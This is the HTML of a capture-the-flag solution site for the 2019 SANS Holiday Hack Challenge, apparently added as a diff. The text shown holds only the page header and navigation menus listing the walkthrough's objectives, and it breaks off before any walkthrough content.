@@ -1,0 +1,2979 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+        <meta name="author" content="Dan Roberts">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.2.0">
+    
+    
+      
+        <title>Game Walkthru - 2019 SANS Holiday Hack Challenge Solution</title>
+      
+    
+    
+      <link rel="stylesheet" href="assets/stylesheets/application.572ca0f0.css">
+      
+        <link rel="stylesheet" href="assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#ef5350">
+      
+    
+    
+      <script src="assets/javascripts/modernizr.8c900955.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="stylesheets/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="red" data-md-color-accent="green">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#objective-0-talk-to-santa-in-the-quad" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="index.html" title="2019 SANS Holiday Hack Challenge Solution" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">ac_unit</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                2019 SANS Holiday Hack Challenge Solution
+              </span>
+              <span class="md-header-nav__topic">
+                Game Walkthru
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="index.html" title="2019 SANS Holiday Hack Challenge Solution" class="md-nav__button md-logo">
+      
+        <i class="md-icon">ac_unit</i>
+      
+    </a>
+    2019 SANS Holiday Hack Challenge Solution
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="index.html" title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Game Walkthru
+      </label>
+    
+    <a href="walkthru.html" title="Game Walkthru" class="md-nav__link md-nav__link--active">
+      Game Walkthru
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective-0-talk-to-santa-in-the-quad" title="Objective 0 - Talk to Santa in the Quad" class="md-nav__link">
+    Objective 0 - Talk to Santa in the Quad
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-1-find-the-turtle-doves" title="Objective 1 - Find the turtle doves" class="md-nav__link">
+    Objective 1 - Find the turtle doves
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-2-unredact-threatening-document" title="Objective 2 - Unredact Threatening Document" class="md-nav__link">
+    Objective 2 - Unredact Threatening Document
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-3-windows-log-analysis-evaluate-attack-outcome" title="Objective 3 - Windows Log Analysis: Evaluate Attack Outcome" class="md-nav__link">
+    Objective 3 - Windows Log Analysis: Evaluate Attack Outcome
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-4-windows-log-analysis-determine-attacker-technique" title="Objective 4 - Windows Log Analysis: Determine Attacker Technique" class="md-nav__link">
+    Objective 4 - Windows Log Analysis: Determine Attacker Technique
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-sugarplum-mary" title="Talk to Sugarplum Mary" class="md-nav__link">
+    Talk to Sugarplum Mary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-linux-path" title="Terminal: Linux Path" class="md-nav__link">
+    Terminal: Linux Path
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-sugarplum-mary" title="Hint from Sugarplum Mary" class="md-nav__link">
+    Hint from Sugarplum Mary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analyze-logs-with-eql" title="Analyze logs with EQL" class="md-nav__link">
+    Analyze logs with EQL
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-5-network-log-analysis-determine-compromised-system" title="Objective 5 - Network Log Analysis: Determine Compromised System" class="md-nav__link">
+    Objective 5 - Network Log Analysis: Determine Compromised System
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-sparkle-redberry" title="Talk to Sparkle Redberry" class="md-nav__link">
+    Talk to Sparkle Redberry
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-xmas-cheer-laser" title="Terminal: Xmas Cheer Laser" class="md-nav__link">
+    Terminal: Xmas Cheer Laser
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-sparkle-redberry" title="Hint from Sparkle Redberry" class="md-nav__link">
+    Hint from Sparkle Redberry
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identify-the-malware-infected-system-using-rita" title="Identify the malware-infected system using RITA" class="md-nav__link">
+    Identify the malware-infected system using RITA
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#revisit-santa" title="Revisit Santa" class="md-nav__link">
+    Revisit Santa
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-6-splunk" title="Objective 6 - Splunk" class="md-nav__link">
+    Objective 6 - Splunk
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-prof-banas" title="Talk to Prof Banas" class="md-nav__link">
+    Talk to Prof Banas
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#investigate-an-incident-using-splunk" title="Investigate an incident using Splunk" class="md-nav__link">
+    Investigate an incident using Splunk
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-prof-banas-again" title="Talk to Prof Banas again" class="md-nav__link">
+    Talk to Prof Banas again
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-7-get-access-to-steam-tunnels" title="Objective 7 - Get access to steam tunnels" class="md-nav__link">
+    Objective 7 - Get access to steam tunnels
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-tangle-coalbox" title="Talk to Tangle Coalbox" class="md-nav__link">
+    Talk to Tangle Coalbox
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#break-the-frosty-doorcode" title="Break the Frosty Doorcode" class="md-nav__link">
+    Break the Frosty Doorcode
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-tangle-coalbox-again" title="Talk to Tangle Coalbox again" class="md-nav__link">
+    Talk to Tangle Coalbox again
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-minty-candycane" title="Talk to Minty Candycane" class="md-nav__link">
+    Talk to Minty Candycane
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-hint-from-minty-candycane" title="Get hint from Minty Candycane" class="md-nav__link">
+    Get hint from Minty Candycane
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#open-the-door-to-the-steam-tunnel" title="Open the door to the steam tunnel" class="md-nav__link">
+    Open the door to the steam tunnel
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-krampus-to-get-the-answer" title="Talk to Krampus to get the answer" class="md-nav__link">
+    Talk to Krampus to get the answer
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-a-hint-from-krampus" title="Get a hint from Krampus" class="md-nav__link">
+    Get a hint from Krampus
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-8-bypass-the-frido-sleigh-capteha" title="Objective 8 - Bypass the Frido Sleigh CAPTEHA" class="md-nav__link">
+    Objective 8 - Bypass the Frido Sleigh CAPTEHA
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-alabaster-snowball" title="Talk to Alabaster Snowball" class="md-nav__link">
+    Talk to Alabaster Snowball
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-escape-the-nyanshell" title="Terminal: Escape the nyanshell" class="md-nav__link">
+    Terminal: Escape the nyanshell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-hint-from-alabaster" title="Get hint from Alabaster" class="md-nav__link">
+    Get hint from Alabaster
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#win-the-fridosleigh-contest" title="Win the Fridosleigh contest" class="md-nav__link">
+    Win the Fridosleigh contest
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-krampus-again" title="Talk to Krampus again" class="md-nav__link">
+    Talk to Krampus again
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-9-retrieve-scraps-of-paper-from-server" title="Objective 9 - Retrieve Scraps of Paper from Server" class="md-nav__link">
+    Objective 9 - Retrieve Scraps of Paper from Server
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-pepper-minstix" title="Talk to Pepper Minstix" class="md-nav__link">
+    Talk to Pepper Minstix
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#investigate-an-incident-using-graylog" title="Investigate an incident using Graylog" class="md-nav__link">
+    Investigate an incident using Graylog
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-pepper-minstix" title="Hint from Pepper Minstix" class="md-nav__link">
+    Hint from Pepper Minstix
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtain-the-scraps-of-paper" title="Obtain the scraps of paper" class="md-nav__link">
+    Obtain the scraps of paper
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-10-recover-cleartext-document" title="Objective 10 - Recover Cleartext Document" class="md-nav__link">
+    Objective 10 - Recover Cleartext Document
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-holly-evergreen" title="Talk to Holly Evergreen" class="md-nav__link">
+    Talk to Holly Evergreen
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-mongo" title="Terminal: Mongo" class="md-nav__link">
+    Terminal: Mongo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-hint-from-holly-evergreen" title="Get hint from Holly Evergreen" class="md-nav__link">
+    Get hint from Holly Evergreen
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recover-the-clear-text-document" title="Recover the clear-text document" class="md-nav__link">
+    Recover the clear-text document
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-11-open-the-sleigh-shop-door" title="Objective 11 - Open the Sleigh Shop Door" class="md-nav__link">
+    Objective 11 - Open the Sleigh Shop Door
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-kent-tinseltooth" title="Talk to Kent Tinseltooth" class="md-nav__link">
+    Talk to Kent Tinseltooth
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-smart-braces-server" title="Terminal: Smart Braces Server" class="md-nav__link">
+    Terminal: Smart Braces Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-kent-tinseltooth" title="Hint from Kent Tinseltooth" class="md-nav__link">
+    Hint from Kent Tinseltooth
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-shinny-upatree" title="Talk to Shinny Upatree" class="md-nav__link">
+    Talk to Shinny Upatree
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unlock-the-crate" title="Unlock the Crate" class="md-nav__link">
+    Unlock the Crate
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-shinny-upatree" title="Hint from Shinny Upatree" class="md-nav__link">
+    Hint from Shinny Upatree
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-the-tooth-fairy" title="Talk to The Tooth Fairy" class="md-nav__link">
+    Talk to The Tooth Fairy
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-12-filter-out-poisoned-sources-of-weather-data" title="Objective 12 - Filter Out Poisoned Sources of Weather Data" class="md-nav__link">
+    Objective 12 - Filter Out Poisoned Sources of Weather Data
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-wunorse-openslae" title="Talk to Wunorse Openslae" class="md-nav__link">
+    Talk to Wunorse Openslae
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-zeek-logs" title="Terminal: Zeek Logs" class="md-nav__link">
+    Terminal: Zeek Logs
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-wunorse-openslae" title="Hint from Wunorse Openslae" class="md-nav__link">
+    Hint from Wunorse Openslae
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-krampus" title="Talk to Krampus" class="md-nav__link">
+    Talk to Krampus
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#block-naughty-hosts" title="Block naughty hosts" class="md-nav__link">
+    Block naughty hosts
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#visit-the-bell-tower" title="Visit the Bell Tower" class="md-nav__link">
+    Visit the Bell Tower
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="narrative.html" title="Narrative" class="md-nav__link">
+      Narrative
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#objective-0-talk-to-santa-in-the-quad" title="Objective 0 - Talk to Santa in the Quad" class="md-nav__link">
+    Objective 0 - Talk to Santa in the Quad
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-1-find-the-turtle-doves" title="Objective 1 - Find the turtle doves" class="md-nav__link">
+    Objective 1 - Find the turtle doves
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-2-unredact-threatening-document" title="Objective 2 - Unredact Threatening Document" class="md-nav__link">
+    Objective 2 - Unredact Threatening Document
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-3-windows-log-analysis-evaluate-attack-outcome" title="Objective 3 - Windows Log Analysis: Evaluate Attack Outcome" class="md-nav__link">
+    Objective 3 - Windows Log Analysis: Evaluate Attack Outcome
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-4-windows-log-analysis-determine-attacker-technique" title="Objective 4 - Windows Log Analysis: Determine Attacker Technique" class="md-nav__link">
+    Objective 4 - Windows Log Analysis: Determine Attacker Technique
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-sugarplum-mary" title="Talk to Sugarplum Mary" class="md-nav__link">
+    Talk to Sugarplum Mary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-linux-path" title="Terminal: Linux Path" class="md-nav__link">
+    Terminal: Linux Path
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-sugarplum-mary" title="Hint from Sugarplum Mary" class="md-nav__link">
+    Hint from Sugarplum Mary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analyze-logs-with-eql" title="Analyze logs with EQL" class="md-nav__link">
+    Analyze logs with EQL
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-5-network-log-analysis-determine-compromised-system" title="Objective 5 - Network Log Analysis: Determine Compromised System" class="md-nav__link">
+    Objective 5 - Network Log Analysis: Determine Compromised System
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-sparkle-redberry" title="Talk to Sparkle Redberry" class="md-nav__link">
+    Talk to Sparkle Redberry
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-xmas-cheer-laser" title="Terminal: Xmas Cheer Laser" class="md-nav__link">
+    Terminal: Xmas Cheer Laser
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-sparkle-redberry" title="Hint from Sparkle Redberry" class="md-nav__link">
+    Hint from Sparkle Redberry
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identify-the-malware-infected-system-using-rita" title="Identify the malware-infected system using RITA" class="md-nav__link">
+    Identify the malware-infected system using RITA
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#revisit-santa" title="Revisit Santa" class="md-nav__link">
+    Revisit Santa
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-6-splunk" title="Objective 6 - Splunk" class="md-nav__link">
+    Objective 6 - Splunk
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-prof-banas" title="Talk to Prof Banas" class="md-nav__link">
+    Talk to Prof Banas
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#investigate-an-incident-using-splunk" title="Investigate an incident using Splunk" class="md-nav__link">
+    Investigate an incident using Splunk
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-prof-banas-again" title="Talk to Prof Banas again" class="md-nav__link">
+    Talk to Prof Banas again
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-7-get-access-to-steam-tunnels" title="Objective 7 - Get access to steam tunnels" class="md-nav__link">
+    Objective 7 - Get access to steam tunnels
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-tangle-coalbox" title="Talk to Tangle Coalbox" class="md-nav__link">
+    Talk to Tangle Coalbox
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#break-the-frosty-doorcode" title="Break the Frosty Doorcode" class="md-nav__link">
+    Break the Frosty Doorcode
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-tangle-coalbox-again" title="Talk to Tangle Coalbox again" class="md-nav__link">
+    Talk to Tangle Coalbox again
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-minty-candycane" title="Talk to Minty Candycane" class="md-nav__link">
+    Talk to Minty Candycane
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-hint-from-minty-candycane" title="Get hint from Minty Candycane" class="md-nav__link">
+    Get hint from Minty Candycane
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#open-the-door-to-the-steam-tunnel" title="Open the door to the steam tunnel" class="md-nav__link">
+    Open the door to the steam tunnel
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-krampus-to-get-the-answer" title="Talk to Krampus to get the answer" class="md-nav__link">
+    Talk to Krampus to get the answer
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-a-hint-from-krampus" title="Get a hint from Krampus" class="md-nav__link">
+    Get a hint from Krampus
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-8-bypass-the-frido-sleigh-capteha" title="Objective 8 - Bypass the Frido Sleigh CAPTEHA" class="md-nav__link">
+    Objective 8 - Bypass the Frido Sleigh CAPTEHA
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-alabaster-snowball" title="Talk to Alabaster Snowball" class="md-nav__link">
+    Talk to Alabaster Snowball
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-escape-the-nyanshell" title="Terminal: Escape the nyanshell" class="md-nav__link">
+    Terminal: Escape the nyanshell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-hint-from-alabaster" title="Get hint from Alabaster" class="md-nav__link">
+    Get hint from Alabaster
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#win-the-fridosleigh-contest" title="Win the Fridosleigh contest" class="md-nav__link">
+    Win the Fridosleigh contest
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-krampus-again" title="Talk to Krampus again" class="md-nav__link">
+    Talk to Krampus again
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-9-retrieve-scraps-of-paper-from-server" title="Objective 9 - Retrieve Scraps of Paper from Server" class="md-nav__link">
+    Objective 9 - Retrieve Scraps of Paper from Server
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-pepper-minstix" title="Talk to Pepper Minstix" class="md-nav__link">
+    Talk to Pepper Minstix
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#investigate-an-incident-using-graylog" title="Investigate an incident using Graylog" class="md-nav__link">
+    Investigate an incident using Graylog
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-pepper-minstix" title="Hint from Pepper Minstix" class="md-nav__link">
+    Hint from Pepper Minstix
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtain-the-scraps-of-paper" title="Obtain the scraps of paper" class="md-nav__link">
+    Obtain the scraps of paper
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-10-recover-cleartext-document" title="Objective 10 - Recover Cleartext Document" class="md-nav__link">
+    Objective 10 - Recover Cleartext Document
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-holly-evergreen" title="Talk to Holly Evergreen" class="md-nav__link">
+    Talk to Holly Evergreen
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-mongo" title="Terminal: Mongo" class="md-nav__link">
+    Terminal: Mongo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-hint-from-holly-evergreen" title="Get hint from Holly Evergreen" class="md-nav__link">
+    Get hint from Holly Evergreen
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recover-the-clear-text-document" title="Recover the clear-text document" class="md-nav__link">
+    Recover the clear-text document
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-11-open-the-sleigh-shop-door" title="Objective 11 - Open the Sleigh Shop Door" class="md-nav__link">
+    Objective 11 - Open the Sleigh Shop Door
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-kent-tinseltooth" title="Talk to Kent Tinseltooth" class="md-nav__link">
+    Talk to Kent Tinseltooth
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-smart-braces-server" title="Terminal: Smart Braces Server" class="md-nav__link">
+    Terminal: Smart Braces Server
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-kent-tinseltooth" title="Hint from Kent Tinseltooth" class="md-nav__link">
+    Hint from Kent Tinseltooth
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-shinny-upatree" title="Talk to Shinny Upatree" class="md-nav__link">
+    Talk to Shinny Upatree
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unlock-the-crate" title="Unlock the Crate" class="md-nav__link">
+    Unlock the Crate
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hint-from-shinny-upatree" title="Hint from Shinny Upatree" class="md-nav__link">
+    Hint from Shinny Upatree
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-the-tooth-fairy" title="Talk to The Tooth Fairy" class="md-nav__link">
+    Talk to The Tooth Fairy
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#objective-12-filter-out-poisoned-sources-of-weather-data" title="Objective 12 - Filter Out Poisoned Sources of Weather Data" class="md-nav__link">
+    Objective 12 - Filter Out Poisoned Sources of Weather Data
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#talk-to-wunorse-openslae" title="Talk to Wunorse Openslae" class="md-nav__link">
+    Talk to Wunorse Openslae
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#terminal-zeek-logs" title="Terminal: Zeek Logs" class="md-nav__link">
+    Terminal: Zeek Logs
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
